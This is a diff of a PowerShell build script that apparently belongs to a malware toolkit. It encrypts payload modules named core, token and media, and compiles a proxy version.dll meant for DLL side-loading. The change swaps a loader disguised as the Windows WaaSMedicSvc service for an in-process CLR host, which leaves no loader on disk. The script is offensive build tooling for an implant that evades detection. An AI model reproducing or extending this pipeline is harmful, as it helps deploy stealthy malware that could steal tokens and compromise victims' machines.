@@ -154,13 +154,7 @@ function Prepare-ProxyPayloads {
         Protect-PayloadFile -InputPath $entry.Key -OutputPath $entry.Value
     }
 
-    if (-not (Test-Path "build\WaaSMedicSvc.exe")) {
-        Write-Host "[FAIL] Missing WaaSMedicSvc.exe for proxy build" -ForegroundColor Red
-        return $false
-    }
-
-    Copy-Item "build\WaaSMedicSvc.exe" "build\WaaSMedicSvc.db" -Force
-    Write-Host "[OK] Protected payloads + WaaSMedicSvc.db ready" -ForegroundColor Green
+    Write-Host "[OK] Protected payloads ready (CLR in-process, no disk loader)" -ForegroundColor Green
     return $true
 }
 
@@ -172,7 +166,6 @@ function Build-ProxyDll {
     }
 
     $requiredFiles = @(
-        "build\WaaSMedicSvc.db",
         "build\payload\core.bin",
         "build\payload\modules\token.bin",
         "build\payload\modules\media.bin"
@@ -200,9 +193,15 @@ function Build-ProxyDll {
 
     $builtAny = $false
 
-    $x64Cmd = "`"$($vcvars64.FullName)`" && rc /nologo /fo build\proxy\version.x64.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x64.res /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
+    $linkLibs = "shell32.lib strsafe.lib mscoree.lib ole32.lib oleaut32.lib"
+    $clFlags = "/nologo /EHsc /LD"
+    $sources = "proxy\version.cpp proxy\clr_host.cpp build\proxy\version.x64.res"
+    $x64Cmd = "`"$($vcvars64.FullName)`" && rc /nologo /fo build\proxy\version.x64.res proxy\version.rc && cl $clFlags $sources /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def $linkLibs"
     cmd /c $x64Cmd 2>&1 | ForEach-Object { Write-Host $_ }
-    if (Test-Path "build\proxy\x64\version.dll") {
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "[FAIL] version.dll (x64) compile failed" -ForegroundColor Red
+    }
+    elseif (Test-Path "build\proxy\x64\version.dll") {
         Copy-Item "build\proxy\x64\version.dll" "build\version.dll" -Force
         $builtAny = $true
         $sizeMb = [math]::Round((Get-Item "build\version.dll").Length / 1MB, 2)
@@ -210,7 +209,8 @@ function Build-ProxyDll {
     }
 
     if ($vcvars32) {
-        $x86Cmd = "`"$($vcvars32.FullName)`" && rc /nologo /fo build\proxy\version.x86.res proxy\version.rc && cl /nologo /LD proxy\version.cpp build\proxy\version.x86.res /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib winhttp.lib"
+        $sourcesX86 = "proxy\version.cpp proxy\clr_host.cpp build\proxy\version.x86.res"
+        $x86Cmd = "`"$($vcvars32.FullName)`" && rc /nologo /fo build\proxy\version.x86.res proxy\version.rc && cl $clFlags $sourcesX86 /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def $linkLibs"
         cmd /c $x86Cmd 2>&1 | ForEach-Object { Write-Host $_ }
         if (Test-Path "build\proxy\x86\version.dll") {
             $builtAny = $true
